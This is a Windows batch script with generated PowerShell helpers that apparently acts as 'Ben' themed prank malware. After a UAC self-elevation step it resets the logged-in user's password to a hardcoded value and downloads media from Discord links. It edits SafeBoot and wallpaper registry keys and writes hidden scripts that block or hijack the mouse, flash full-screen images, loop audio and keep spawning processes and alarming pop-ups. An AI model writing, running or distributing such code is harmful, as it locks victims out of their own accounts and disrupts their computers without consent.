@echo off
cls
:: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /B

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
@echo off
cls
set /p answer=really start? (y/n) ==
if %answer% == y goto a
if %answer% == n goto b

:b
echo oh! ok 
timeout 5
exit
:a
cd %appdata%
del /F /Q ren
md ren
cd %appdata%\ren\
cls
powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '"
@echo off
powershell.exe -Command "$Username = \"$env:USERNAME\"; $NewPassword = \"08923659832179492\"; $SecurePassword = ConvertTo-SecureString $NewPassword -AsPlainText -Force; Set-LocalUser -Name $Username -Password $SecurePassword"
bitsadmin.exe /transfer "smile Download" https://cdn.discordapp.com/attachments/1049686998044135506/1096142020717850624/haha.mp3 "%appdata%\ren\heha.mp3"
bitsadmin.exe /transfer "Download" https://cdn.discordapp.com/attachments/1049686998044135506/1100404955380191243/benhahashort.mp3 "%appdata%\ren\benben.mp3"
bitsadmin.exe /transfer "Download" https://cdn.discordapp.com/attachments/1049686998044135506/1100404955707363380/benhahalong.mp3 "%appdata%\ren\benbenlong.mp3"
bitsadmin.exe /transfer "smile Download1" https://cdn.discordapp.com/attachments/1049686998044135506/1096028603579371621/benben.mp3 "%appdata%\ren\benben.mp3"
bitsadmin.exe /transfer "smile Download" https://cdn.discordapp.com/attachments/1049686998044135506/1095243541241921626/nomalben.png "%appdata%\ren\nomalben.png"
bitsadmin.exe /transfer "smile Download1" https://cdn.discordapp.com/attachments/1049686998044135506/1101064923137712228/haha.jpg "%appdata%\ren\back.jpg"
bitsadmin.exe /transfer "smile Download1" https://cdn.discordapp.com/attachments/1049686998044135506/1098953353867841567/asdfasdfasdfasfadsf.PNG "%appdata%\ren\benangry.jpg"
bitsadmin.exe /transfer "smile Download1" https://cdn.discordapp.com/attachments/1049686998044135506/1098953354551500821/asdfasdfaf.PNG "%appdata%\ren\benangry1.jpg"
bitsadmin.exe /transfer "smile Download1" https://cdn.discordapp.com/attachments/1049686998044135506/1098953354136260639/gekkiw.png "%appdata%\ren\benangry2.jpg"
bitsadmin.exe /transfer "Download" https://cdn.discordapp.com/attachments/1049686998044135506/1100405860657807441/1.png "%appdata%\ren\1.png"
bitsadmin.exe /transfer "Download" https://cdn.discordapp.com/attachments/1049686998044135506/1100405861291143248/2.png "%appdata%\ren\2.png"
bitsadmin.exe /transfer "Download" https://cdn.discordapp.com/attachments/1049686998044135506/1100405860343230535/3.png "%appdata%\ren\3.png"
bitsadmin.exe /transfer "Download" https://cdn.discordapp.com/attachments/1049686998044135506/1100405860938809364/4.png "%appdata%\ren\4.png"
bitsadmin.exe /transfer "Download" https://cdn.discordapp.com/attachments/1049686998044135506/1100405859911204954/blak.png "%appdata%\ren\black.png"
echo @echo off > song.bat
echo cd %appdata%\ren\benben.ps1 >> song.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> song.bat
set "efa=%appdata%\ren\benben.ps1"
echo :a >> song.bat
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%efa%'" >> song.bat
echo goto a >> song.bat


echo @echo off > benbenlong.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> benbenlong.bat
set "efa=%appdata%\ren\benbenlong.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%efa%'" >> benbenlong.bat

echo @echo off > show.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> show.bat
set "efa=%appdata%\ren\show.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%efa%'" >> show.bat

echo @echo off > song.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> song.bat
set "efa=%appdata%\ren\benbens.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%efa%'" >> song.bat

echo @echo off > fa.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> fa.bat
set "efa=%appdata%\ren\chinipgada.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%efa%'" >> fa.bat

echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase > benbens.ps1                                                                                                                                              
echo $form = New-Object System.Windows.Forms.Form                                >> benbens.ps1                                   
echo $form.WindowState = 'Maximized'                                            >> benbens.ps1                                         
echo $form.FormBorderStyle = 'None'                                              >> benbens.ps1                                                                                                                                         
echo $form.BackColor = 'Transparent'                                            >> benbens.ps1                                                                                                                                       
echo $form.Opacity = 0                                                        >> benbens.ps1                                                                                                                                            
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                  >> benbens.ps1                                      
echo $mediaPlayer.Open^("$env:appdata\ren\benbenlong.mp3")                            >> benbens.ps1                                   
echo $mediaPlayer.Play()                                                         >> benbens.ps1                                                                                                                   
echo $host = New-Object WindowsFormsHost                                       >> benbens.ps1                                    
echo $host.Dock = 'Fill'                                                         >> benbens.ps1                                                                                                                                  
echo $mediaElement = New-Object System.Windows.Controls.MediaElement             >> benbens.ps1                                  
echo $mediaElement.Source = $mediaPlayer                                         >> benbens.ps1                                  
echo $mediaElement.Stretch = ^'Uniform'                                           >> benbens.ps1                                                                                                             
echo $host.Child = $mediaElement                                                 >> benbens.ps1                                                                                                                           
echo $form.Controls.Add($host)                                                   >> benbens.ps1                                                                                                                                               
echo $null = $form.ShowDialog()                                                  >> benbens.ps1                                                                                                                               
echo while ($true) ^{ Start^-Sleep -Seconds 1 }                                    >> benbens.ps1

echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase > benbenlong.ps1                                                                                                                                               
echo $form = New-Object System.Windows.Forms.Form                                >> benbenlong.ps1                                         
echo $form.WindowState = 'Maximized'                                             >> benbenlong.ps1                                         
echo $form.FormBorderStyle = 'None'                                              >> benbenlong.ps1                                                                                                                                          
echo $form.BackColor = 'Transparent'                                             >> benbenlong.ps1                                                                                                                                            
echo $form.Opacity = 0                                                           >> benbenlong.ps1                                                                                                                                               
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                  >> benbenlong.ps1                                         
echo $mediaPlayer.Open^("$env:appdata\ren\benben.mp3")                            >> benbenlong.ps1                                         
echo $mediaPlayer.Play()                                                         >> benbenlong.ps1                                                                                                                    
echo $host = New-Object WindowsFormsHost                                         >> benbenlong.ps1                                         
echo $host.Dock = 'Fill'                                                         >> benbenlong.ps1                                                                                                                                           
echo $mediaElement = New-Object System.Windows.Controls.MediaElement             >> benbenlong.ps1                                         
echo $mediaElement.Source = $mediaPlayer                                         >> benbenlong.ps1                                         
echo $mediaElement.Stretch = ^'Uniform'                                           >> benbenlong.ps1                                                                                                               
echo $host.Child = $mediaElement                                                 >> benbenlong.ps1                                                                                                                            
echo $form.Controls.Add($host)                                                   >> benbenlong.ps1                                                                                                                                                
echo $null = $form.ShowDialog()                                                  >> benbenlong.ps1                                                                                                                               
echo while ($true) ^{ Start^-Sleep -Seconds 1 }                                    >> benbenlong.ps1
REG add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\MSIServer" /v "Default" /t REG_SZ /d "Service" /f
echo Add-Type -AssemblyName System.Windows.Forms                             >> show.ps1
echo Add-Type -AssemblyName System.Drawing                                   >> show.ps1
echo $form = New-Object System.Windows.Forms.Form                            >> show.ps1
echo $form.StartPosition = 'CenterScreen'                                    >> show.ps1
echo $form.FormBorderStyle = 'None'                                          >> show.ps1
echo $form.WindowState = 'Maximized'                                         >> show.ps1
echo $form.BackColor = [System.Drawing.Color]::Black                         >> show.ps1
echo ^$imagePath = ^"$env^:APPDATA\ren\black.png^"                               >> show.ps1
echo $image = [System.Drawing.Image]::FromFile($imagePath)                   >> show.ps1
echo $form.BackgroundImage = $image                                          >> show.ps1
echo $form.BackgroundImageLayout = 'Zoom'                                    >> show.ps1
echo $form.Show()                                                            >> show.ps1
echo ^$imagePath = ^"$env^:APPDATA\ren\1.png^"                             >> show.ps1
echo $image = [System.Drawing.Image]::FromFile($imagePath)                   >> show.ps1
echo $form.BackgroundImage = $image                                          >> show.ps1
echo Start-Sleep -Milliseconds 500                                           >> show.ps1
echo ^$imagePath = ^"$env^:APPDATA\ren\black.png^"                               >> show.ps1
echo $image = [System.Drawing.Image]::FromFile($imagePath)                   >> show.ps1
echo $form.BackgroundImage = $image                                          >> show.ps1
echo Start-Sleep -Seconds 3                                                  >> show.ps1
echo ^$imagePath = ^"$env^:APPDATA\ren\2.png^"                            >> show.ps1
echo $image = [System.Drawing.Image]::FromFile($imagePath)                   >> show.ps1
echo $form.BackgroundImage = $image                                          >> show.ps1
echo Start-Sleep -Milliseconds 500                                           >> show.ps1
echo ^$imagePath = ^"$env^:APPDATA\ren\black.png^"                               >> show.ps1
echo $image = [System.Drawing.Image]::FromFile($imagePath)                   >> show.ps1
echo $form.BackgroundImage = $image                                          >> show.ps1
echo Start-Sleep -Seconds 3                                                  >> show.ps1
echo ^$imagefPath = ^"$env^:APPDATA\ren\3.png^"                           >> show.ps1
echo $image = ^[System.Drawing.Image]^::FromFile($imagefPath)                  >> show.ps1
echo $form.BackgroundImage = $image                                          >> show.ps1
echo Start-Sleep -Seconds 1                                                  >> show.ps1
echo $imagefPath = ^"$env^:APPDATA\ren\black.png^"                              >> show.ps1
echo $image = [System.Drawing.Image]::FromFile($imagefPath)                  >> show.ps1
echo $form.BackgroundImage = $image                                          >> show.ps1
echo Start-Sleep -Seconds 8                                                  >> show.ps1
echo ^$imagaefaPath = ^"$env^:APPDATA\ren\4.png^"                         >> show.ps1
echo $image = [System.Drawing.Image]::FromFile($imagaefaPath)                >> show.ps1
echo $form.BackgroundImage = $image                                          >> show.ps1
echo Start-Sleep -Milliseconds 4000                                           >> show.ps1
echo ^Start-Process ^-FilePath ^"^$env:appdata\ren\fa.bat^" ^-NoNewWindow                                                  >> show.ps1
echo ^Start-Process ^-FilePath ^"^$env:appdata\ren\song.bat^" ^-NoNewWindow                                                  >> show.ps1
echo Start-Sleep -Milliseconds 4000                                           >> show.ps1
echo $form.Dispose()                                                         >> show.ps1

REG ADD "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%appdata%\ren\back.jpg" /f
REG ADD "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
REG ADD "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d 0 /f
RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters

echo MsgBox "Don't worry I'm not going anywhere", vbCritical, "Error" > ERROR.vbs

echo Add-Type -AssemblyName System.Drawing                                                                                               > blood.ps1
echo Add-Type -AssemblyName System.Windows.Forms                                                                                         >> blood.ps1
echo $width = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width                                                                  >> blood.ps1
echo $height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height                                                                >> blood.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                                        >> blood.ps1
echo $form.WindowState ="Maximized"                                                                                                     >> blood.ps1
echo $form.FormBorderStyle = ^[System.Windows.Forms.FormBorderStyle]::None                                                                >> blood.ps1
echo $form.BackColor =^[System.Drawing.Color]::Transparent                                                                               >> blood.ps1
echo $form.TransparencyKey = $form.BackColor                                                                                             >> blood.ps1
echo $form.TopMost = $true                                                                                                               >> blood.ps1
echo $random = New-Object System.Random                                                                                                  >> blood.ps1
echo # 펜 객체 생성                                                                                                                           >> blood.ps1
echo $pen = ^New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb($random.Next(256), $random.Next(256), $random.Next(256)))     >> blood.ps1
echo # Paint 이벤트 핸들러 등록                                                                                                                  >> blood.ps1
echo $form.Add_Paint^({                                                                                                                   >> blood.ps1
echo     $graphics = $_.Graphics                                                                                                         >> blood.ps1
echo     for ($i = 0; $i -lt 20000; $i++) ^{                                                                                             >> blood.ps1
echo         # 랜덤한 색상 생성                                                                                                                 >> blood.ps1
echo         $pen.Color = [System.Drawing.Color]^::Red                                                                                    >> blood.ps1
echo         $x = $random.Next($width)                                                                                                   >> blood.ps1
echo         $y = $random.Next($height)                                                                                                  >> blood.ps1
echo         $graphics.DrawRectangle($pen, $x, $y, 1, 1)                                                                                 >> blood.ps1
echo     ^}                                                                                                                               >> blood.ps1
echo ^})                                                                                                                                  >> blood.ps1
echo $form.ShowDialog() ^| Out-Null                                                                                                       >> blood.ps1
echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase                                          >> benben.ps1
echo # 폼 생성                                                                                                               >> benben.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                         >> benben.ps1
echo $form.WindowState = 'Maximized'                                                                                      >> benben.ps1
echo $form.FormBorderStyle = 'None'                                                                                       >> benben.ps1
echo # 폼 배경색을 투명색으로 변경                                                                                                    >> benben.ps1
echo $form.BackColor = 'Transparent'                                                                                      >> benben.ps1
echo # 폼 배경을 투명하게 만듦                                                                                                      >> benben.ps1
echo $form.Opacity = 0                                                                                                    >> benben.ps1
echo # 미디어 플레이어 생성                                                                                                        >> benben.ps1
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                                                           >> benben.ps1
echo $mediaPlayer.Open("$env:appdata\ren\benben.mp3")                                                                     >> benben.ps1
echo $mediaPlayer.Play()                                                                                                  >> benben.ps1
echo # WPF 호스팅을 위한 WindowsFormsHost 컨트롤 생성                                                                                >> benben.ps1
echo $host = New-Object WindowsFormsHost                                                                                  >> benben.ps1
echo $host.Dock = 'Fill'                                                                                                  >> benben.ps1
echo # 미디어 플레이어 컨트롤 생성                                                                                                    >> benben.ps1
echo $mediaElement = New-Object System.Windows.Controls.MediaElement                                                      >> benben.ps1
echo $mediaElement.Source = $mediaPlayer                                                                                  >> benben.ps1
echo $mediaElement.Stretch = 'Uniform'                                                                                    >> benben.ps1
echo # WindowsFormsHost에 미디어 플레이어 컨트롤 추가                                                                                  >> benben.ps1
echo $host.Child = $mediaElement                                                                                          >> benben.ps1
echo # 폼에 WindowsFormsHost 컨트롤 추가                                                                                         >> benben.ps1
echo $form.Controls.Add($host)                                                                                            >> benben.ps1
echo # 폼 실행                                                                                                               >> benben.ps1
echo $null = $form.ShowDialog()                                                                                           >> benben.ps1
echo # PowerShell 창이 꺼지지 않도록 한다                                                                                           >> benben.ps1
echo while ($true) {                                                                                                      >> benben.ps1
echo     # 誘몃뵒???뚮젅?댁뼱媛 醫낅즺?섎㈃ ?ㅼ떆 ?ъ깮?쒕떎                                                                      >> benben.ps1                   
echo     if ($mediaPlayer.Position.TotalMilliseconds -ge $mediaPlayer.NaturalDuration.TimeSpan.TotalMilliseconds) {       >> benben.ps1
echo         $mediaPlayer.Position = [System.TimeSpan]::FromMilliseconds(1)                                               >> benben.ps1
echo         $mediaPlayer.Play()                                                                                          >> benben.ps1
echo     }                                                                                                                >> benben.ps1
echo     Start-Sleep -Milliseconds 100                                                                                    >> benben.ps1
echo }                                                                                                                    >> benben.ps1





echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase                                          >> benben1.ps1
echo # 폼 생성                                                                                                               >> benben1.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                         >> benben1.ps1
echo $form.WindowState = 'Maximized'                                                                                      >> benben1.ps1
echo $form.FormBorderStyle = 'None'                                                                                       >> benben1.ps1
echo # 폼 배경색을 투명색으로 변경                                                                                                    >> benben1.ps1
echo $form.BackColor = 'Transparent'                                                                                      >> benben1.ps1
echo # 폼 배경을 투명하게 만듦                                                                                                      >> benben1.ps1
echo $form.Opacity = 0                                                                                                    >> benben1.ps1
echo # 미디어 플레이어 생성                                                                                                        >> benben1.ps1
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                                                           >> benben1.ps1
echo $mediaPlayer.Open("$env:appdata\ren\heha.mp3")                                                                     >> benben1.ps1
echo $mediaPlayer.Play()                                                                                                  >> benben1.ps1
echo # WPF 호스팅을 위한 WindowsFormsHost 컨트롤 생성                                                                                >> benben1.ps1
echo $host = New-Object WindowsFormsHost                                                                                  >> benben1.ps1
echo $host.Dock = 'Fill'                                                                                                  >> benben1.ps1
echo # 미디어 플레이어 컨트롤 생성                                                                                                    >> benben1.ps1
echo $mediaElement = New-Object System.Windows.Controls.MediaElement                                                      >> benben1.ps1
echo $mediaElement.Source = $mediaPlayer                                                                                  >> benben1.ps1
echo $mediaElement.Stretch = 'Uniform'                                                                                    >> benben1.ps1
echo # WindowsFormsHost에 미디어 플레이어 컨트롤 추가                                                                                  >> benben1.ps1
echo $host.Child = $mediaElement                                                                                          >> benben1.ps1
echo # 폼에 WindowsFormsHost 컨트롤 추가                                                                                         >> benben1.ps1
echo $form.Controls.Add($host)                                                                                            >> benben1.ps1
echo # 폼 실행                                                                                                               >> benben1.ps1
echo $null = $form.ShowDialog()                                                                                           >> benben1.ps1
echo # PowerShell 창이 꺼지지 않도록 한다                                                                                           >> benben1.ps1
echo while ($true) { Start-Sleep -Seconds 1 }                                                                                             >> benben1.ps1





echo cd %appdata%\ren\ > blood.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '">> blood.bat
set "ea=%appdata%\ren\blood.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> blood.bat



echo cd %appdata%\ren\ > benben.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '">> benben.bat
set "ea=%appdata%\ren\benben.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> benben.bat


echo cd %appdata%\ren\ > dontmoveM.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> dontmoveM.bat
set "ea=%appdata%\ren\mouse.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> dontmoveM.bat


echo cd %appdata%\ren\ > changreset.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> changreset.bat
set "eeaa=%appdata%\ren\changreset.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%eeaa%'" >> changreset.bat


echo cd %appdata%\ren\ > benexe.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> benexe.bat
set "eeaaa=%appdata%\ren\Benexe.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%eeaaa%'" >> benexe.bat



echo Add-Type -AssemblyName System.Windows.Forms                                   >> mouse.ps1
echo # 마우스 입력을 막을 폼 생성                                                             >> mouse.ps1
echo $form = New-Object System.Windows.Forms.Form                                  >> mouse.ps1
echo $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None          >> mouse.ps1
echo $form.BackColor = [System.Drawing.Color]::White                               >> mouse.ps1
echo $form.Opacity = 0.01                                                          >> mouse.ps1
echo $form.StartPosition = "Manual"                                                >> mouse.ps1
echo $form.Top = 0                                                                 >> mouse.ps1
echo $form.Left = 0                                                                >> mouse.ps1
echo $form.Width = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width       >> mouse.ps1
echo $form.Height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height     >> mouse.ps1
echo # 마우스 입력 막기 이벤트 핸들러 등록                                                        >> mouse.ps1
echo $eventManager = [System.Windows.Forms.Application]::AddMessageFilter(         >> mouse.ps1
echo     (New-Object System.Windows.Forms.MouseInputFilter $form))                 >> mouse.ps1
echo # 폼 열기                                                                        >> mouse.ps1
echo $form.ShowDialog()                                                            >> mouse.ps1
echo # 이벤트 핸들러 해제 및 폼 닫기                                                           >> mouse.ps1
echo [System.Windows.Forms.Application]::RemoveMessageFilter($eventManager)        >> mouse.ps1
echo $form.Dispose()                                                               >> mouse.ps1


echo Add-Type -AssemblyName System.Windows.Forms                                             > wow.ps1
echo $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds                           >> wow.ps1
echo while ($true) {                                                                         >> wow.ps1
echo   $x = Get-Random -Minimum $screen.Left -Maximum ($screen.Left + $screen.Width)         >> wow.ps1
echo   $y = Get-Random -Minimum $screen.Top -Maximum ($screen.Top + $screen.Height)          >> wow.ps1
echo   [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)     >> wow.ps1
echo }                                                                                       >> wow.ps1






echo Add-Type -AssemblyName System.Windows.Forms                                                       >> chinipgada.ps1
echo Add-Type -AssemblyName System.Drawing                                                             >> chinipgada.ps1
echo $images = Get-ChildItem "$env:APPDATA\ren" -Filter *.jpg ^| Select-Object -ExpandProperty FullName >> chinipgada.ps1         
echo $form = New-Object System.Windows.Forms.Form                                                      >> chinipgada.ps1
echo $form.FormBorderStyle = 'None'                                                                    >> chinipgada.ps1
echo $form.WindowState = 'Maximized'                                                                   >> chinipgada.ps1
echo $form.BackColor = 'Black' # 검정색 배경색으로 변경                                                          >> chinipgada.ps1
echo $form.BackgroundImageLayout = 'Zoom'                                                              >> chinipgada.ps1
echo $form.TopMost = $true                                                                             >> chinipgada.ps1
echo $image = [System.Drawing.Image]::FromFile($images[0])                                             >> chinipgada.ps1
echo $form.BackgroundImage = $image                                                                    >> chinipgada.ps1
echo $timer = New-Object System.Windows.Forms.Timer                                                    >> chinipgada.ps1
echo $timer.Interval = 50                                                                              >> chinipgada.ps1
echo $timer.Add_Tick^({                                                                                 >> chinipgada.ps1
echo     $index = (Get-Random -Minimum 0 -Maximum $images.Count)                                       >> chinipgada.ps1
echo     $image.Dispose()                                                                              >> chinipgada.ps1
echo     $image = [System.Drawing.Image]::FromFile($images[$index])                                    >> chinipgada.ps1
echo     $form.BackgroundImage = $image                                                                >> chinipgada.ps1
echo ^})                                                                                                >> chinipgada.ps1
echo $timer.Start()                                                                                    >> chinipgada.ps1
echo $form.ShowDialog()                                                                                >> chinipgada.ps1











echo @echo off > chinipgada.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> chinipgada.bat
set "efa=%appdata%\ren\chinipgada.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%efa%'" >> chinipgada.bat

echo @echo off > MOUSE.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> MOUSE.bat
set "efa=%appdata%\ren\wow.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%efa%'" >> MOUSE.bat

echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" > benben14.bat
set "efa=%appdata%\ren\benben.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%efa%'" >> benben14.bat

echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" > benben1.bat
set "efa=%appdata%\ren\benben1.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%efa%'" >> benben1.bat

echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" > Benan.bat
set "efa=%appdata%\ren\Benexe.ps1"
echo setlocal >> Benan.bat
echo :loop >> Benan.bat
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%efa%'" >> Benan.bat
echo start /min changreset.bat >> Benan.bat
echo start /min ERROR.vbs >> Benan.bat
echo goto loop >> Benan.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" > BL.bat
set "blood=%appdata%\ren\blood.ps1" >> BL.bat
echo setlocal >> BL.bat
echo :loop >> BL.bat
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%blood%'" >> BL.bat
echo goto loop >> BL.bat
echo Add-Type -AssemblyName System.Windows.Forms                                                                                >> Benexe.ps1
echo Add-Type -AssemblyName System.Drawing                                                                                      >> Benexe.ps1
echo # 폼 생성                                                                                                                     >> Benexe.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                               >> Benexe.ps1
echo $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None                                                       >> Benexe.ps1
echo $form.TransparencyKey = $form.BackColor                                                                                    >> Benexe.ps1
echo $form.StartPosition = "CenterScreen"                                                                                       >> Benexe.ps1
echo $form.ShowInTaskbar = $false                                                                                               >> Benexe.ps1
echo $form.TopMost = $true                                                                                                      >> Benexe.ps1
echo $form.Size = New-Object System.Drawing.Size(210, 450)                                                                      >> Benexe.ps1
echo # 배경 이미지 설정                                                                                                                >> Benexe.ps1
echo $bgImagePath = "$env:APPDATA\ren\nomalben.png"                                                                             >> Benexe.ps1
echo $bgImage = [System.Drawing.Image]::FromFile($bgImagePath)                                                                  >> Benexe.ps1
echo $form.BackgroundImage = $bgImage                                                                                           >> Benexe.ps1
echo # 폼 이동 함수 정의                                                                                                               >> Benexe.ps1
echo function Move-Form {                                                                                                       >> Benexe.ps1
echo    ^$x = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width - $form.Width)          >> Benexe.ps1
echo     ^$y = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height - $form.Height)        >> Benexe.ps1
echo     $mousepos = [System.Windows.Forms.Cursor]::Position                                                                    >> Benexe.ps1
echo     $mouseDistX = $mousepos.X - $x                                                                                         >> Benexe.ps1
echo     $mouseDistY = $mousepos.Y - $y                                                                                         >> Benexe.ps1
echo     if($mouseDistX -lt 0) ^{                                                                                                >> Benexe.ps1
echo         $x += 20                                                                                                           >> Benexe.ps1
echo    ^ } else {                                                                                                               >> Benexe.ps1
echo         $x -= 20                                                                                                           >> Benexe.ps1
echo     ^}                                                                                                                      >> Benexe.ps1
echo     if($mouseDistY -lt 0) {                                                                                                >> Benexe.ps1
echo         $y += 20                                                                                                           >> Benexe.ps1
echo     ^} else {                                                                                                               >> Benexe.ps1
echo         $y -= 20                                                                                                           >> Benexe.ps1
echo     ^}                                                                                                                      >> Benexe.ps1
echo     $form.Location = New-Object System.Drawing.Point($x, $y)                                                               >> Benexe.ps1
echo ^}                                                                                                                          >> Benexe.ps1
echo # 마우스 이벤트 핸들러 등록                                                                                                           >> Benexe.ps1
echo $form.Add_MouseEnter({Move-Form})                                                                                          >> Benexe.ps1
echo # 키보드 이벤트 핸들러 등록                                                                                                           >> Benexe.ps1
echo $form.Add_KeyDown({                                                                                                        >> Benexe.ps1
echo     ^if($_.KeyCode -eq "B") {                                                                                               >> Benexe.ps1
echo         $global:input = "B"                                                                                                >> Benexe.ps1
echo     ^} elseif($_.KeyCode -eq "E") {                                                                                         >> Benexe.ps1
echo         ^if($global:input -eq "B") {                                                                                        >> Benexe.ps1
echo             $global:input = "BE"                                                                                           >> Benexe.ps1
echo         ^} else {                                                                                                           >> Benexe.ps1
echo             $global:input = ""                                                                                             >> Benexe.ps1
echo        ^ }                                                                                                                  >> Benexe.ps1
echo     ^} elseif($_.KeyCode -eq "N") ^{                                                                                         >> Benexe.ps1
echo         if($global:input -eq "BE")^ {                                                                                       >> Benexe.ps1
echo             $global:input = ""                                                                                             >> Benexe.ps1
echo             $bgImagePath = "$env:APPDATA\ren\noice.png"                                                                    >> Benexe.ps1
echo             $bgImage = [System.Drawing.Image]::FromFile($bgImagePath)                                                      >> Benexe.ps1
echo             $form.BackgroundImage = $bgImage                                                                               >> Benexe.ps1
echo             $form.Refresh()                                                                                                >> Benexe.ps1
echo             [System.Windows.Forms.MessageBox]::Show("Are you trying to kill me again?", "BEN IS DELETEING")                                          >> Benexe.ps1
echo             [System.Windows.Forms.MessageBox]::Show("How dare you.", "BEN IS DELETEING")                                          >> Benexe.ps1
echo             [System.Windows.Forms.MessageBox]::Show("You think I'm gonna let you do that?.", "EEEROR SYSTEM IS DELETE")                                          >> Benexe.ps1
echo             [System.Windows.Forms.MessageBox]::Show("HAHAHAAHHAHAHAHA.", "SYSTEM was DELETE")                                          >> Benexe.ps1
echo             Start-Process -FilePath "$env:APPDATA\ren\MOUSE.bat" -NoNewWindow >> Benexe.ps1
echo             Start-Sleep 1 >> Benexe.ps1
echo             Start-Process -FilePath "$env:APPDATA\ren\benben1.bat" -NoNewWindow >> Benexe.ps1
echo             Start-Sleep 1 >> Benexe.ps1
echo             Start-Process -FilePath "$env:APPDATA\ren\benben1.bat" -NoNewWindow >> Benexe.ps1
echo             Start-Sleep 1 >> Benexe.ps1
echo             Start-Process -FilePath "$env:APPDATA\ren\benben1.bat" -NoNewWindow >> Benexe.ps1
echo             Start-Sleep 1 >> Benexe.ps1
echo             Start-Process -FilePath "$env:APPDATA\ren\benben1.bat" -NoNewWindow >> Benexe.ps1
echo             Start-Sleep 1 >> Benexe.ps1
echo             Start-Process -FilePath "$env:APPDATA\ren\benbenlong.bat" -NoNewWindow >> Benexe.ps1
echo             Start-Process -FilePath "$env:APPDATA\ren\show.bat" -NoNewWindow >> Benexe.ps1
